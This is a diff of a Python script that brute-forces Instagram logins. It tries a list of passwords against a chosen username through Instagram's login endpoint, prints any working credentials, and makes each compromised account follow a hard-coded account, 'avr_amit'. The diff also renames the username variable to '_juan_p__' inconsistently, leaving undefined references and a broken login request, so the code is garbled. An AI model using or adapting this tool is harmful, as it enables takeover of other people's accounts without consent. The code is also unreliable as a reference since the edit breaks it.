@@ -16,18 +16,18 @@ else:
 
 
 
-def userExists(username):
-	r = requests.get('https://www.instagram.com/%s/?__a=1' % username) 
+def userExists(_juan_p__):
+	r = requests.get('https://www.instagram.com/%s/?__a=1' % _juan_p__) 
 	if (r.status_code == 404):
 		print ('User not found')
 		return False
 	elif (r.status_code == 200):
 		followdata = json.loads(r.text)
 		fUserID = followdata['user']['id']
-		return {'username':username,'id':fUserID}
+		return {'_juan_p__':_juan_p__,'id':fUserID}
 
 
-def Login(username,password):
+def Login(_juan_p__,password):
 	sess = requests.Session()
 	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
 	sess.headers.update({
@@ -49,7 +49,7 @@ def Login(username,password):
 	r = sess.get('https://www.instagram.com/') 
 	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 
-	data = {'username':username, 'password':password}
+	data = {'_juan_p__':_juan_p__, 'password':password}
 	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
 	token = r.cookies.get_dict()['csrftoken']
 	sess.headers.update({'X-CSRFToken' : token})
@@ -67,22 +67,22 @@ def Login(username,password):
 
 
 
-def follow(sess, username):
-	username = userExists(username)
-	if (username == False):
+def follow(sess, _juan_p__):
+	_juan_p__ = userExists(_juan_p__)
+	if (_juan_p__ == False):
 		return	
 	else:
-		userID = username['id']
+		userID = _juan_p__['id']
 		followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
 		print (followReq.text)
 
 
-username = str(input('Please enter a username: '))
-username = userExists(username)
-if (username == False):
+username = str(input('Please enter a username:_juan_p__ '))
+username = userExists(_juan_p__)
+if (_juan_p__ == False):
 	exit()
 else:
-	username = username['username']
+	username = _juan_p__['_juan_p__']
 
 
 
@@ -91,9 +91,9 @@ delayLoop = int(input('Please add delay between the passwords (in seconds): '))
 
 for i in range(len(passwords)):
 	password = passwords[i]
-	sess = Login(username,password)
+	sess = Login(_juan_p__,password)
 	if (sess):
-		print ('Login success %s' % [username,password])
+		print ('Login success %s' % [_juan_p__,password])
 
 		#because i am cool
 		follow(sess,'avr_amit')
